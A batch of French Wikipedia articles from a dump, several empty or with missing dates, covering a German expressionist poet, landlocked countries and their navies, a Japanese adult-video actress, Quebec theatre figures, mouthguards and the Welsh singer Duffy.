<doc id="2844820" url="https://fr.wikipedia.org/wiki?curid=2844820" title="August Stramm">
August Stramm

August Stramm est un dramaturge et poète allemand, né à Münster le et mort dans les marais du Pripiat (Empire russe) le .
Jugé comme l'un des précurseurs du théâtre expressionniste allemand, Stramm reste très peu connu et est rarement monté de nos jours en France.
Biographie.
Renonçant à des études de théologie, il entre dans l'administration des postes allemandes puis accomplit son service militaire. Il commence à écrire dès le tournant du siècle, notamment un essai "Émigrés !". Muté à Berlin en 1905 où il est nommé inspecteur des postes en 1909, il commence à écrire pour le théâtre. Plusieurs pièces naissent en parallèle à ses poèmes mais ne trouvent pas d'éditeur ("Le Sacrifice", "Le Mari", "Les Stériles"). Il fait la connaissance et se lie à Herwarth Walden, chef de file de l'avant-garde expressionniste, qui dirige la revue "Der Sturm" , où les écrits de Stramm vont paraître.
Stamm écrit "Rudimentaire", "Éveil", et travaille à une autre pièce "Forces", lorsqu'il est enrôlé en 1914. Il combat dans les Vosges avec le grade d'officier d'infanterie et participe à la guerre des tranchées, montrant un courage et un sens de l'honneur peu communs. Du 20 août 1914 au 25 août 1915, il entretient une correspondance avec ses amis Herwath et Nell Walden et sa femme Else, elle aussi écrivain, tout en continuant à écrire des poèmes décrivant l'horreur et l'absurdité de la guerre. En janvier 1915, il est décoré de la Croix de fer (de seconde classe) pour son service en France.
Il est envoyé sur le front de l'Est et promu commandant de son bataillon. Il refuse l'aide de Walden qui a obtenu l'autorisation de le faire exempter. Il meurt dans un combat en corps à corps, le septembre, à Horodec près de Kobryn, aujourd'hui en Biélorussie.
Anecdote.
Stramm a fait l'objet d'une plaisanterie de la part du dramaturge allemand Heiner Muller sur la post-modernité : « Le seul post-moderniste que je connaisse est August Stramm qui était un moderniste et travaillait dans une poste ».
Œuvres.
Les œuvres de Stramm sont traduites en français aux éditions Comp'Act :

</doc>
<doc id="2844824" url="https://fr.wikipedia.org/wiki?curid=2844824" title="Marie-Ange Cerezuela">
Marie-Ange Cerezuela



</doc>
<doc id="2844826" url="https://fr.wikipedia.org/wiki?curid=2844826" title="La vie c'est comme ça">
La vie c'est comme ça



</doc>
<doc id="2844828" url="https://fr.wikipedia.org/wiki?curid=2844828" title="Église syriaque orthodoxe antiochienne">
Église syriaque orthodoxe antiochienne

LÉglise syriaque orthodoxe antiochienne est une Église vieille-calendariste.
L'Église était auparavant une Église autonome fondée pour l'Europe par l'Église malankare orthodoxe qui a consacré son primat Mar Severius Mushe Görgün le .
Cette Église jouit aujourd'hui d'une autonomie canonique par décision du Saint-Synode de l'Église malankare orthodoxe qui s'est réuni du 23 au .
Nom.
Cette Église était aussi connue sous d'autres noms :
Histoire.
Le à Thrissur, le Rabban Mushe Görgün, moine de l'Église syriaque orthodoxe en Allemagne a été, avec l'accord du Saint-Synode, consacré métropolite par deux évêques de l'Église malankare orthodoxe puis excommunié par son Église d'origine.
Un synode épiscopal de l'Église malankare orthodoxe se réunit à son siège à Kottayam du 23 au , reconnaît la consécration du métropolite et la nouvelle juridiction autonome de cette Église alors dénommée « Église syriaque orthodoxe en Europe », accordant à son métropolite Mar Severius Mushe Görgün la dignité de primat.
Jusqu'en , les fidèles des diverses juridictions syriaques orthodoxes des Indes vivant en diaspora à l'étranger étaient, lorsqu'ils contractaient mariage avec un fidèle de l'Église syriaque orthodoxe en Europe, interdits de sacrements dans leurs Églises d'origine respectives. Pour mettre un terme à cette situation, l'Église malankare orthodoxe consacra un évêque indien le et condamna toute intervention en dehors de sa juridiction propre, à savoir l'Europe : c'est alors que la métropolie (archidiocèse) syriaque orthodoxe d'Europe devint l'« Église syriaque orthodoxe antiochienne ».
Lors du Saint Synode des 21 et , pour apaiser ses relations avec son Église-mère, l'Église malankare orthodoxe, et ne pas interférer dans les querelles inter-juridictionnelles des Églises syriennes au Kérala, les diocèses syriaques orthodoxes antiochiens de l'Inde du Sud sont dissous.
L'Église syriaque orthodoxe antiochienne est reçue en 2016 dans la juridiction de l'Église des vrais chrétiens orthodoxes de Grèce - Synode du calendrier Patristique.
Organisation.
L'Église est présente en Allemagne, Pays-Bas, Belgique, France, Royaume-Uni et États-Unis.
Synode :
Formation du clergé.
Le monastère de Saint-Gabriel en Allemagne.
Voir aussi.
L'Église syriaque orthodoxe antiochienne est en étroite relation avec l'Église syrienne orthodoxe indépendante en Amérique.

</doc>
<doc id="2844840" url="https://fr.wikipedia.org/wiki?curid=2844840" title="Aimé du Mont-Cassin">
Aimé du Mont-Cassin

Aimé du Mont-Cassin ("Amatus Casinensis" en latin ; "Amato di Montecassino" en italien) est un moine bénédictin de l'abbaye du Mont-Cassin en Italie, qui fut peut-être aussi un évêque d'un diocèse de la Campanie. Il est le chroniqueur d'une "Histoire des Normands" qui est l'une des principales sources concernant les aventures des Normands en Italie du Sud et en Sicile au .
Biographie.
Né probablement entre les années 1020 et les années 1030, Aimé du Mont-Cassin est un homme d'Église connu surtout pour être l'un des trois principaux chroniqueurs connus narrant l'histoire des Normands en Italie méridionale au (des années 1010 aux années 1080), avec Geoffroi Malaterra et Guillaume de Pouille.
Selon Pierre Diacre, il a composé un poème intitulé "De gestis sanctorum Petri et Pauli" et dédié au pape Grégoire VII.
Vers 1080, il achève son "Ystoire de li Normant", rédigée en latin, en huit livres, aujourd'hui disparus. Cet ouvrage narre notamment les aventures de Robert Guiscard, l'un des Normands les plus fameux, et de Richard Drengot. Une traduction de cette histoire des Normands, datant du , est conservée à la Bibliothèque nationale de France.
Aimé du Mont-Cassin meurt un peu après 1100, autour de 1105.

</doc>
<doc id="2844841" url="https://fr.wikipedia.org/wiki?curid=2844841" title="Louis Lazare d'Ajot">
Louis Lazare d'Ajot



</doc>
<doc id="2844845" url="https://fr.wikipedia.org/wiki?curid=2844845" title="Pays sans littoral">
Pays sans littoral

Un pays sans littoral ou pays enclavé ("") est un pays dont le territoire n'a pas de contact direct avec une mer ouverte (c'est-à-dire directement reliée à l'océan mondial). Son accès à la mer peut se faire seulement en traversant le territoire d'un autre pays ; il est donc intégralement délimité par des frontières terrestres.
Depuis , dans le monde sont sans littoral.
Enjeu stratégique.
Généralement l'absence d'accès direct à la mer est un inconvénient puisque cela coupe le pays des ressources maritimes comme la pêche, mais surtout du commerce maritime, important pour le commerce international.
C'est pourquoi au cours de l'histoire, divers pays ont cherché à obtenir un accès à la mer. Certains, initialement enclavés, l'ont obtenu (Russie). La mise en place du corridor de Dantzig par le traité de Versailles en avait également pour but d'assurer un accès à la mer à la Pologne. D'autres en ont eu un qu'ils ont perdu, tels les pays enclavés issus de l'ancienne Autriche-Hongrie (Autriche, Hongrie, Slovaquie, Tchéquie), la Bolivie après la Guerre du Pacifique () qui réclame depuis, au Chili, un accès à la mer, ou encore l'Éthiopie, à l'issue de la Guerre d'indépendance de l'Érythrée en 1993, qui a conduit à l'Indépendance de cette dernière et à la perte du littoral de la Mer Rouge pour l'Éthiopie. Ces pays ont conservé des traditions maritimes même si leurs bateaux ne peuvent relâcher que dans des ports devenus étrangers.
Les désavantages économiques liés à l'enclavement peuvent être atténués ou aggravés en fonction du degré de développement, des barrières linguistiques et d'autres facteurs. Certains pays enclavés sont riches, comme Andorre, l'Autriche, le Liechtenstein, le Luxembourg, Saint-Marin, la Suisse et le Vatican. Tous, à l'exception du Luxembourg, membre fondateur de l'OTAN, utilisent fréquemment la neutralité dans leurs relations internationales. Cependant, sans littoral, incluant tous les pays enclavés d'Afrique, d'Asie et d'Amérique du Sud, sont classés dans les pays en développement sans littoral (PDSL) par les Nations-Unies. Huit des douze pays ayant les indices de développement humain (IDH) les plus bas sont sans littoral.
Liste des pays sans littoral membres de l'ONU.
Asie.
(*) : Possèdent un littoral sur une mer fermée : la Mer Caspienne.
Pays sans littoral pouvant accéder à la mer via un fleuve navigable.
Pour les navires maritimes.
L'enclavement ne constitue pas toujours une absence d'accès à la mer : deux pays enclavés ont accès à la mer par de grands fleuves suffisamment larges et profonds, sans barrages, ponts bas, cataractes ou gués, permettant l'accès des navires marins :
Pour les péniches.
D'autres pays enclavés ont accès à la mer par de grands fleuves permettant l'accès des péniches :
Pays ayant des frontières uniquement avec d'autres pays sans littoral.
Un pays sans littoral peut être entouré uniquement par d'autres pays dans le même cas. Pour avoir accès à la mer à partir de ce pays, il faudra donc traverser deux frontières. Ces pays sont dits « doublement enclavés ».
Il n'existe que deux pays dans le monde qui sont dans ce cas :
Pays enclavés dans un seul pays.
La plupart des pays sans littoral sont entourés par plusieurs autres pays. Néanmoins, trois d'entre eux ne sont enclavés que dans un seul pays :
Pays sans littoral non-membres de l'ONU.
Depuis (renonciation de la Jordanie à toute revendication sur les territoires palestiniens occupés) un État sans accès à la mer, observateur non-membre de l'ONU mais reconnu par membres (70,5 % des membres que compte l'Organisation des Nations unies) est, en Asie :
Depuis la fin du , en raison des guerres civiles, des conflits post-yougoslaves et post-soviétiques, sont apparues huit entités territoriales de fait auto-proclamées indépendantes mais non-reconnues internationalement comme États souverains de droit, dont trois sont sans accès à la mer :

</doc>
<doc id="2844846" url="https://fr.wikipedia.org/wiki?curid=2844846" title="Nana Natsume">
Nana Natsume

Nana Natsume (夏目ナナ, Natsume Nana) est un mannequin de charme Elle a remporté de nombreux prix au cours de sa carrière.
Biographie.
Natsume est née le à Sakai, préfecture d'Osaka, Japon (l'année de sa naissance est habituellement donnée en 1982 y compris pour sa biographie sur SOD, mais son site officiel la situe en 1980).
Elle reçoit une éducation plutôt conventionnelle ce qui la rend relativement "réservée" et inexpérimentée pour ce qui touche au sexe. Natsume avoue se trouver gênée pendant le tournage des scènes de sexe (). Elle prétend que ses premières expériences de mazophallation et de masturbation datent de ses films pornographiques.
Après avoir obtenu un diplôme de fin d'études secondaires, Natsume occupe divers emplois dont celui d'assistante dentaire et d'agent immobilier.
Carrière.
Natsume commence sa carrière dans la pornographie par des émissions télévisées roses telles que "On Girls' File" et "Cure Sick Night" diffusées à des heures tardives sur les antennes d'une chaîne d'Osaka. Elle est contactée pour travailler dans l'industrie de la pornographie en 2002 et déménage à Tōkyō où elle pose pour des revues pornographiques telles que "Shūkan Gendai" et "Weekly Post". En juillet 2002, elle paraît dans les pages d'un album photo intitulé "727" et dans un DVD "image" (DVD sans nudité. L'actrice, habillée de manière suggestive (lingeries fines par exemple), pose dans des attitudes provocantes) diffusé en novembre 2002.
L'actrice de films pornographiques.
Natsume paraît, en public, pour la première fois à l'occasion de la cérémonie des prix de la vidéo pornographique parrainée par SOD au Century Hyatt hotel de Shinjuku (Tokyo) le et dont elle est l'animatrice. Elle y fait une forte impression par son calme et son assurance. Natsume est restée fidèle à SOD sa carrière durant, tournant habituellement une vidéo par mois.
Sa première vidéo produite par les studios SOD paraît en janvier 2004 sous le titre "Début".
"Final Pussy", une vidéo de science-fiction réalisée par Noboru Iguchi,
lui fait interpréter le rôle d'un dangereux personnage engendré par des expériences de l'armée. Des pistolets jaillissent de ses seins lorsqu'elle est sexuellement excitée et tuent quiconque a un rapport avec elle. Les effets spéciaux sont l'œuvre de Yoshihiro Nishimura bien connu dans le cinéma gore.
Un peu plus tard, en novembre 2005, paraît "Nana Natsume Showered by Semen" son premier film de bukkake réalisé par Kazuhiko Matsumoto auquel on attribue la paternité de ce genre de pornographie. Tout aussi intéressante est sa vidéo de intitulée "Stripper". Il s'agit d'une romance entre lesbiennes mise en scène par TOHJIRO, ex-réalisateur de SOD. Natsume a pour partenaire Kurumi Morishita, ex-étoile de SOD.
"Dirty DVD for Girls", une vidéo pornographique destinée surtout à un public féminin, lui vaut un petit article dans le "Mainichi Shimbun". Le quotidien la qualifie de .
Les journaux cancaniers de Tokyo prédisent son départ de l'industrie pornographique pour la fin du mois d'octobre 2007. Sa publication d'adieux consiste en une série de huit DVD d'une durée de seize heures reprenant la totalité de son travail depuis ses débuts.
L'actrice travaille pour la télévision.
Télévision, radio and cinéma conventionnels.
Tout au long de sa carrière, Natsume est régulièrement parue au cours de programmes télévisés et radiodiffusés dont le sien propre, "Garnet Energy", en 2005, parrainé par SOD (FM NACK5 79.5 MHz). En 2007, elle est DJ sur "Nana Natsume's Sparkling Moonbow" (夏目ナナのキラキラ☆moonbow), une émission sur sa propre radio FM Chisato basée à Osaka.
Elle est également l'une des filles de SOD de l'émission de variétés "NeoHappy" de 2006 à laquelle succède "DIVA" en 2007, toutes deux parrainées par la firme.
Un petit rôle lui est offert dans la série diffusé sur les antennes de TV Asahi en 11 épisodes de juillet à 
Après avoir quitté l'industrie de la pornographie, Natsume poursuit son travail dans les médias conventionnels. Elle remplit les fonctions de journaliste régulière pour l'information au sein de l'émission de variétés "Johnny Word of Mouth" (くちコミジョニー) diffusé tous les mardis sur les antennes de NTV de à , date de la fin de l'émission. Elle figure dans "Guren Onna" (ぐれんオンナ) une histoire de fantôme faisant appel au cosplay et diffusée par TV Tokyo en 12 épisodes du au .
Natsume a un rôle important dans le film d'horreur à faible budget intitulé "Samurai Zombie" (Yoroi) qui a commencé en 2008 au South Korean Puchon Fantastic Film Festival. Le film est réalisé par Tak Sakaguchi et produit par SOD. Elle interprète également le rôle d'un chef de gang dans le film "Sasori" réalisé par Joe Ma en 2008. Cette production sino japonaise est une reprise du film hong-kongais "Female Convict Scorpion" et d'après une revue .
Autres activités.
Chanteuse, Natsume interprète le J-pop à succès de 1982 intitulé "Sekido Komachi Dokit!" (赤道小町ドキッ!) paru en CD et DVD vidéo le sous la marque Chipper Records.
Natsume prête sa voix pour le jeu vidéo "Ryu Ga Gotoku 2" (龍が如く2) sur console Sega ou "Yakuza 2" sur PlayStation 2 parus le . Son rôle d'hôtesse dans une boîte de nuit est mineur dans le jeu mais de important dans son lancement.
L'actrice est pressentie pour être le support de la publicité du jeu "You Mustn't Look" (Mitewa Ikenai - みてはいけない) impliquant un fantôme doué de pouvoirs surnaturels et produit par Dimple sur Nintendo DS en . Une partie de la campagne publicitaire est basée sur une série de photos réalisée à partir d'une bande dessinée ainsi que sur une bande vidéo visibles dans les magasins du distributeur Famitsu.
Le magazine de culture populaire "Spa!" publie en un article à son nom dans lequel elle vante à ses lecteurs en quête de succès féminins les mérites d'une bonne hygiène corporelle, d'une bonne haleine et d'un aspect soigné de leur personne.
Natsume a pu réaliser son vieux rêve d'ouvrir un « Salon de Santé (ヒーリングサロン) » à Osaka à l'enseigne de TORICO. On y pratique des massages à l'aide d'huiles essentielles qui procure la santé et supprime la fatigue. Ce salon a célébré son premier anniversaire le .
En 2008, Natsume est présente sur de grandes affiches placardées à Tokyo dans le cadre de la campagne « STOP! STD » contre les maladies sexuellement transmissibles (MST) au Japon parrainée par les studios de vidéos pornographiques Soft On Demand.
Il existe, pour les inconditionnels de Nana, des appartements décorés à son effigie dans le quartier de Nishi-ku d'Osaka. Un grand poster la représentant trône au -dessus du lit, des images d'elle ornent la cuisine et la salle de bains ainsi que les couloirs. Les prix de la location sont de 149 000 yens (€1300) pour un 3 pièces et 480 000 yens (€4300) pour un 4 pièces.
Filmographie (partielle).
Les titres sont donnés en langue anglaise suivis du titre en japonais lorsqu'il est connu.
Récompenses.
Natsume à plusieurs fois été primée que ce soit par les médias, l'industrie du film pornographique ou ses admirateurs.

</doc>
<doc id="2844850" url="https://fr.wikipedia.org/wiki?curid=2844850" title="Bathymétrique">
Bathymétrique



</doc>
<doc id="2844856" url="https://fr.wikipedia.org/wiki?curid=2844856" title="Bruno Migliorini">
Bruno Migliorini

Bruno Migliorini (né le à Rovigo et mort le à Florence) est un linguiste italien, figure du mouvement espérantiste italien.
Biographie.
Docteur ès lettres, il fut lecteur puis assistant puis professeur de langue italienne à l'Université La Sapienza de Rome. De 1930 à 1933, il fut rédacteur en chef de l’"Enciclopedia Italiana". De 1933 à 1938, il occupa un poste de professeur à l'Université de Fribourg et de 1938 à 1966, à l'Université de Florence. De 1949 à 1963, il fut président de l'Accademia della Crusca, académie de la langue italienne, puis associé national de l'Accademia dei Lincei. Il était un des linguistes italiens les plus autorisés du .
En 1936, il fonda avec Giacomo Devoto la revue "Lingua Nostra", dont il fut le directeur. Son œuvre est d'abord consacrée aux problèmes de la langue nationale et aux rapports entre la langue et la culture, mais également à des recherches sur les langues internationales créées, en particulier l'espéranto. C'est à lui que les Italiens doivent le mot "regista", introduit en 1940 à la place du gallicisme « régisseur », pendant la campagne d'italianisation des mots étrangers de la période fasciste.
Devenu espérantiste en 1912, il fonda la même année un groupe à Rovigo. En 1914, il créa un groupe espérantiste « L. L. Zamenhof » à Venise et en 1921 il lança un groupe à Rome. Il écrivit une grammaire pour les Italiens (deux éditions) et un manuel international d'espéranto (en collaboration avec son frère Elio Migliorini). Il donna des conférences aux universités d'été d'Oxford (Someraj Universitatoj de Oksfordo) dans le cadre du congrès mondial d’espéranto de 1930 et du en 1932 à Paris. En 1921, parut son livre "Anekdotoj pri Dante" ("Anecdotes sur Dante"), réédité en 1956. Dans plusieurs revues il publia des articles consacrés à la linguistique générale, au vocabulaire espérantiste et à d'autres projets de langues créées auxquels il s'opposait. En 1955, il devint membre du comité d'honneur du congrès mondial à Bologne. Depuis le premier numéro et jusqu'à sa mort il appartint au comité de rédaction de "La Monda Lingvo-Problemo". Il meurt en 1975 à l'âge de 78 ans.

</doc>
<doc id="2844860" url="https://fr.wikipedia.org/wiki?curid=2844860" title="Controverses scientifiques">
Controverses scientifiques



</doc>
<doc id="2844862" url="https://fr.wikipedia.org/wiki?curid=2844862" title="24 (série)">
24 (série)



</doc>
<doc id="2844872" url="https://fr.wikipedia.org/wiki?curid=2844872" title="Mike Doyle">
Mike Doyle



</doc>
<doc id="2844874" url="https://fr.wikipedia.org/wiki?curid=2844874" title="George Mason (Personnage de 24)">
George Mason (Personnage de 24)



</doc>
<doc id="2844880" url="https://fr.wikipedia.org/wiki?curid=2844880" title="Fred Barry">
Fred Barry

Frédéric Barry, dit Fred, est un comédien, chanteur et directeur de théâtre québécois né à Montréal le et mort à Montréal le .
Biographie.
Fils d'un modeste hôtelier de Montréal, Frédéric Barry s'est initié au théâtre dès l'enfance. Dès 1916, il devient directeur de la troupe du Théâtre Impérial à Québec. 
En 1930, Fred Barry met sur pied, avec le comédien Albert Duquesne, la troupe Barry-Duquesne qui s'installe dès le début au cinéma Chanteclerc, qui sera connue éventuellement sous le nom de Théâtre Stella. Cette salle de 443 places était située rue Saint-Denis (où on trouve aujourd'hui le Théâtre du rideau vert) à Montréal.
Fred Barry et Albert Duquesne sont entourés au sein de cette troupe par Bella Ouellette, Marthe Thiéry, Antoine Godeau, Pierre Durand, Mimi d'Estée, Henry Deyglun, Jeanne Demons et Gaston Dauriac.
La troupe Barry-Duquesne, accompagnée du Quatuor Alouette s'embarque pour Paris en 1937. Marthe Thiéry, Mimi d'Estée, Bella Ouellette, Fred Barry, Albert Duquesne et Henry Deyglun vont jouer la pièce de Deyglun, "Vers la terre canadienne". Pour la première fois, une troupe québécoise présente une pièce d'ici en France.
Même si la troupe Barry-Duquesne perdurera pendant près de 30 ans, cette tentative d'implanter un théâtre permanent à Montréal échoue. Fred Barry va devoir amorcer un tournant majeur de sa carrière, alors que deux acteurs importants de la scène théâtrale montréalaise font appel à lui pour soutenir leurs entreprises théâtrales. D'abord, Gratien Gélinas, qui l'engage pour le seconder à la mise en scène et pour jouer dans "les Fridolinades" (1938-1946), qui débouche sur la création de la pièce "Tit-Coq" en 1948 - Barry fut également de la distribution de la version cinématographique qu'en tira Gélinas en 1952. Puis, le tout jeune Pierre Dagenais qui lui réserve une place au sein de ses productions, en saluant en lui un symbole vivant du théâtre canadien. Durant quarante ans, Fred Barry a ainsi exercé son métier de comédien dans des conditions matérielles souvent peu favorables.
Acteur né, Fred Barry traverse les difficiles années trente et quarante en trouvant refuge à la radio, alors en plein essor, et en prenant part à de nombreuses revues et à des spectacles d'opérette. À la radio de Radio-Canada, il fut Georges Beauchamp dans le feuilleton radiophonique "Rue Principale" et le docteur Cyprien dans "Un homme et son péché". Il sera aussi une des vedettes du cycle de Robert Choquette des Velder dans les radioromans "La Pension Velder" (1938-1942) et "Métropole" (1943-1956).
Crédité avec raison du titre de pionnier du jeu « à la canadienne », Fred Barry a fait l'objet d'un documentaire de Claude Jutra, "Fred Barry comédien" (ONF, 1959). Il meurt à la suite d'une longue maladie le ; son décès est souligné par la publication d'une brochure d'hommages réalisée par le journaliste Philippe Laframboise qui lui consacrera plus tard un ouvrage, "Fred Barry et la petite histoire du théâtre au Québec" en 1966. 
Le fonds d'archives de Fred Barry et Bella Ouellette est conservé au centre d'archives de Montréal de Bibliothèque et Archives nationales du Québec. Sa sépulture est située dans le Cimetière Notre-Dame-des-Neiges, à Montréal.

</doc>
<doc id="2844887" url="https://fr.wikipedia.org/wiki?curid=2844887" title="Roman Marakhovski">
Roman Marakhovski

Roman Marakhovski (né le à Kharkov en République socialiste soviétique d'Ukraine) est un joueur professionnel de hockey sur glace ukrainien devenu entraîneur.
Carrière de joueur.
Il commença sa carrière professionnelle dans la Ligue centrale de hockey lors de la saison 1998-1999. Il s'alignait alors avec les Cottonmouths de Columbus. Il joua plusieurs saisons dans le hockey mineures en Amérique du Nord avant de partir jouer quelques saisons en France.
Il s'aligna donc pour des clubs français avant de revenir en Amérique en 2006-2007 dans la "East Coast Hockey League". Il fit un retour avec les Cottonmouths en 2007-2008.

</doc>
<doc id="2844888" url="https://fr.wikipedia.org/wiki?curid=2844888" title="Sans accès à la mer">
Sans accès à la mer



</doc>
<doc id="2844889" url="https://fr.wikipedia.org/wiki?curid=2844889" title="Édouard Baudry">
Édouard Baudry

Édouard (Eddy) Baudry est un auteur radiophonique et journaliste canadien (québécois), né à Gentbrugge (Belgique) le et mort au Maroc le , . 
Biographie.
Il est l'auteur et le réalisateur de plusieurs feuilletons radiophoniques québécois, dont "Rue Principale" (1937-1959), qui a un succès rapide et dont il fut le concepteur et l'âme du au . En 1940, il publie le livre "Rue Principale", qui présente les dessous de cette émission radiophonique. Il est aussi le deuxième président de l'Union des artistes du Québec.
Journaliste, il devient en 1942 correspondant de guerre. Le , l'avion qu'il prend pour se rendre à la Conférence de Casablanca est abattu au-dessus du Maroc. La nouvelle a un grand retentissement dans les médias montréalais. Le président des États-Unis Franklin Delano Roosevelt, alors au Maroc, dépose une couronne près du lieu de l'accident. La dépouille d'Édouard Baudry est demeurée à Port-Lyautey.
Honneurs.
Les comédiens et artisans de la radio montréalaise CKAC rendent hommage à Édouard Baudry dans le cadre d'une émission spéciale diffusée sur les ondes de la station, le .

</doc>
<doc id="2844890" url="https://fr.wikipedia.org/wiki?curid=2844890" title="Forces navales des pays sans littoral">
Forces navales des pays sans littoral

Certains pays sans littoral maritime, comme la Bolivie ou le Kazakhstan par exemple, possèdent une marine militaire. D'autres pays possèdent des bateaux militaires mis en œuvre par d'autres armes, le plus souvent par les forces terrestres. Il s'agit généralement de forces navales déployées sur des lacs ou des fleuves (marine fluviale). Dans cet article, les mers d'Aral (en voie d'asséchement) et Caspienne (fermée) sont considérées comme des lacs. Les pays sans littoral maritime dont une frontière est un fleuve ou un lac, peuvent éprouver le besoin de protéger cette frontière et d'y patrouiller avec des forces militaires. Dans certaines régions, le déplacement de forces militaires par voie d'eau intérieure peut aussi être plus aisée que par la route.
Les navires utilisés par les marines sans littoral sont généralement, par nécessité, de petite taille. Les patrouilleurs de différents types sont les embarcations les plus courantes. Certaines pays possèdent des moyens de transport de troupes ou de véhicules, permettant aux forces terrestres de traverser ou de se déplacer sur un lac ou le long d'une rivière.
Liste de pays sans littoral maritime avec une force navale.
Forces navales non indépendantes.
La compagnie uruguayenne de patrouille navale (URPAC) de la MONUSCO opère des patrouilleurs et d'autres embarcations, notamment sur le lac Kivu et le lac Tanganyika (port de Kalundu (Uvira)).

</doc>
<doc id="2844908" url="https://fr.wikipedia.org/wiki?curid=2844908" title="Protège-dents">
Protège-dents

Un protège-dents, un protège-dent ou une protection intrabuccale est une pièce en matière synthétique moulée (parfois fabriquée sur mesure) que l'on porte dans la bouche pour se protéger la cavité buccale (muqueuses, langue, condyle mandibulaire et dents) lors de certaines activités sportives présentant un risque (rugby, boxe, hockey sur glace, football américain). Les protèges-dents peuvent être simples (protection seule de la partie supérieure de la mâchoire) ou doubles (protection complète de la denture) mais cette dernière variante entraîne en général une plus grande difficulté à respirer par la bouche. C'est pourquoi une majorité des boxeurs et rugbymans par exemple utilisent des protèges-dents simple.
Histoire.
Un des premiers protège-dents fut développé en 1890 par Woolf Krause, un dentiste de Londres, pour protéger les boxeurs de coupures ou lacérations des lèvres. 
Le protège-dents moderne a été créé vers les années 1970, par le A. W. S. Wood, un dentiste pédiatrique canadien, pour réduire et de prévenir les blessures faite à la denture des jeunes joueurs de hockey.
Protège dents et santé.
Des athlètes se sont inquiété quant à d'éventuels effets négatif des protège-dents pour leur santé buccodentaire ou sur leur performance sportive. 
Quelques études ont donc porté sur d'éventuels effets du protège-dent sur la santé buccale (qui est de manière générale plus mauvaise chez les sportifs de haut niveau que dans la population générale). Selon la littérature scientifique (limitée) sur le sujet, utilisé de manière normale, le protège-dent ne semble avoir d'impact négatif pour la santé buccodentaire, hormis sur la capacité tampon de la salive ; il n'influence ni la consistance de la salive, ni le nombre de microbes qu'on y retrouve.
Des études ont montré que les protège-dents protègent contre les blessures dentaires (traumatismes dento-alvéolaires) chez les athlètes de sports de combat ou de contact, mais aussi qu'ils peuvent diminuer le risque de commotions cérébrales chez les sportifs et pas seulement pour les sports de combat. (par exemple dans le hockey sur glace a révélé une réduction des commotions cérébrales et des blessures dentaires. 
Les protège-dents sont obligatoires dans de nombreux sports de contact quand la commotion cérébrale présente un risque important.
Les protège-dents faits sur mesure montrent sont "a priori" ceux qui protègent le mieux, et qui ont le moins d'effets dans les performances des joueurs, par rapport aux autres types.
En médecine du sport, selon Gallagher (2021) dans la revue "Nature", un dentiste ayant une formation spécialisée peut être précieux pour une équipe sportive les jours de matchs (in situ ou en téléconsultation), pour coordonner la prise en charge des traumatismes dentaires et oro-faciaux.

</doc>
<doc id="2845124" url="https://fr.wikipedia.org/wiki?curid=2845124" title="Antoine Callet">
Antoine Callet



</doc>
<doc id="2845372" url="https://fr.wikipedia.org/wiki?curid=2845372" title="Duffy (chanteuse)">
Duffy (chanteuse)

Aimée Ann Duffy, alias Duffy, est une chanteuse britannique, née le à Bangor (Gwynedd).
Biographie.
Aimée Ann dite Duffy a grandi à Nefyn sur la presqu'île de Llŷn au pays de Galles. Lors du divorce de ses parents, Duffy (alors âgée de dix ans), sa sœur jumelle Katy, sa sœur aînée Kelly et leur mère s'installent dans le Pembrokeshire. Sa langue maternelle est le gallois.
Elle considère que la chanson a toujours été une part d'elle, mais étant originaire d'un petit village elle préféra conserver cette envie secrète. Elle n'en parla à personne jusqu'à l'âge de seize ans, quand ses amis l'encouragèrent à chanter.
À l'âge de dix-sept ans, la jeune Duffy, encore mineure, est repérée sur un site musical anglo-saxon par le producteur américano-suisse Soren Mounir - également connu sous le pseudonyme de Dorian Gray en tant qu'interprète - avec lequel elle va coécrire près de 50 chansons sous le nom de Soulego. Le duo, composé à Genève entre 2002 et 2003, se produit sur scène en juillet 2003 au pays de Galles lors du festival Wakestock, considéré comme l'un des plus importants du Royaume-Uni.
À l'âge de dix-neuf ans, elle décide d'utiliser le pseudonyme Duffy dans sa vie professionnelle comme personnelle.
Duffy est sous contrat avec A&amp;M Records depuis 2007. Elle participe au show télévisé "Later with Jools Holland" en novembre 2007 et à nouveau en février 2008. Elle interprète "Mercy" qui parvient en tête des ventes dans de nombreux pays européens, et reste cinq semaines en tête des ventes de singles au Royaume-Uni.
Après un Grammy, elle gagne aux Brits Awards 2009.
En 2010, elle sort un second album, intitulé "Endlessly".
En février 2011, Duffy annonce avoir pris la décision de faire une longue pause afin de préparer un troisième album.
En 2013, elle apparaît aux Francofolies dans un hommage à Édith Piaf. Elle y reprend "Hymn To Love". L'événement prend place au Beacon Theatre à New York, le 19 septembre 2013, puis est diffusé en différé sur France 2, le 5 octobre.
En mai 2015, il a non officiellement été annoncé qu'elle ferait son retour sur le devant de la scène avec un nouvel album au cours de l'année 2016.
Elle fait une apparition en tant que Timi Yuro dans le film "Legend". Elle chante 3 chansons pour la bande son du film : 2 reprises de Timi Yuro et une musique originale. "Whole Lot Of Love" est ainsi son nouveau single sorti en septembre 2015 en même temps que le titre "Dear Heart" (composition originale également).
Le , elle explique son absence sur le réseau social Instagram en confiant avoir été victime de viols, droguée et retenue en captivité durant plusieurs jours.
Comparaison avec d'autres chanteuses.
Duffy est une des chanteuses les plus importantes appartenant à la catégorie des « nouvelles Amys » (en référence à la chanteuse Amy Winehouse). Sous le titre "Les Nouvelles Amys", Adam Thompson a écrit dans "The Times" : « Duffy, Gabriella Cilmi et Adele mènent l'attaque en vue de devenir la prochaine Amy Winehouse. À première vue, elles ont toutes de grands yeux innocents et beaucoup de talent - un point de départ qui semble familier, non ? ». Duffy elle-même n'apprécie pas être appelée « la nouvelle Dusty Springfield ». Elle dit ne pas comprendre cette comparaison et estime que la comparer à d'autres ou la placer dans un mouvement est un « gimmick ». Elle juge que « personne n'est remplaçable ». La chanteuse Alison Goldfrapp, pour sa part, pense que même si Duffy a une voix extraordinaire, on l'a entraînée à avoir le même type de son qu'Amy Winehouse, dans le cadre d'un plan marketing, croyant (de façon erronée) que Duffy était allée à la "Brit School" (une école enseignant les arts, située à Londres).
La chanteuse britannique Estelle a critiqué Duffy et Adele pour ne pas représenter comme il le faudrait la véritable musique soul. Duffy s'accorda sur cette critique en disant elle-même qu'elle n'essayait pas de « définir » la musique soul mais contesta le fait que la couleur de peau devait être d'une quelconque importance. 
Aux États-Unis, Duffy est vue comme faisant partie d'une récente vague de chanteuses britanniques, ou « envahisseuses britanniques » ayant investi le courant Retro-soul. Là-bas, la Motown est vue comme une influence cruciale sur cette "vague".

</doc>
